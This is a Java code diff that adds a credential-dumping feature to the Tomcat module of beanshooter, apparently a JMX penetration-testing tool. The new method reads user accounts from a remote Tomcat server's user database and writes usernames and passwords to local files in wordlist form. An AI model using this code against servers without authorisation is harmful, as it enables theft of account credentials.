@@ -1,9 +1,16 @@
 package de.qtc.beanshooter.mbean.tomcat;
 
+import java.io.BufferedWriter;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.PrintWriter;
 import java.lang.reflect.Proxy;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 
 import javax.management.MBeanException;
 
+import de.qtc.beanshooter.cli.ArgumentHandler;
 import de.qtc.beanshooter.exceptions.ExceptionHandler;
 import de.qtc.beanshooter.io.Logger;
 import de.qtc.beanshooter.mbean.MBean;
@@ -97,6 +104,66 @@ public class Dispatcher extends de.qtc.beanshooter.mbean.Dispatcher
         }
 
         Logger.decreaseIndent();
+    }
+
+    /**
+     * Dump available credentials from the tomcat server.
+     */
+    public void dump()
+    {
+        String userFile = ArgumentHandler.require(MemoryUserDatabaseMBeanOption.USER_FILE);
+        String passFile = MemoryUserDatabaseMBeanOption.PASS_FILE.getValue();
+
+        Path userPath = Paths.get(userFile).normalize().toAbsolutePath();
+        Path passPath = null;
+
+        if (passFile != null)
+            passPath = Paths.get(passFile).normalize().toAbsolutePath();
+
+        TomcatUser[] users = getUsers();
+
+        if( users.length == 0 )
+        {
+            Logger.printlnMixedYellow("tomcat server", "does not", "contain any users.");
+            return;
+        }
+
+        Logger.println("Dumping credentials...");
+
+        try (PrintWriter pw = new PrintWriter(new BufferedWriter(new FileWriter(userPath.toString()))))
+        {
+            for (TomcatUser user : users)
+            {
+                if (passPath == null)
+                    pw.println(user.getUsername() + ":" + user.getPassword());
+
+                else
+                    pw.println(user.getUsername());
+            }
+
+            Logger.printlnMixedYellow("Users dumped to", userPath.toString());
+        }
+
+        catch (IOException e)
+        {
+            ExceptionHandler.handleFileWrite(e, userPath.toString(), true);
+        }
+
+        if (passPath == null)
+            return;
+
+        try (PrintWriter pw = new PrintWriter(new BufferedWriter(new FileWriter(passPath.toString()))))
+        {
+            for (TomcatUser user : users)
+                pw.println(user.getPassword());
+
+            Logger.printlnMixedYellow("Passwords dumped to", passPath.toString());
+        }
+
+        catch (IOException e)
+        {
+            ExceptionHandler.handleFileWrite(e, passPath.toString(), true);
+        }
     }
 
     /**
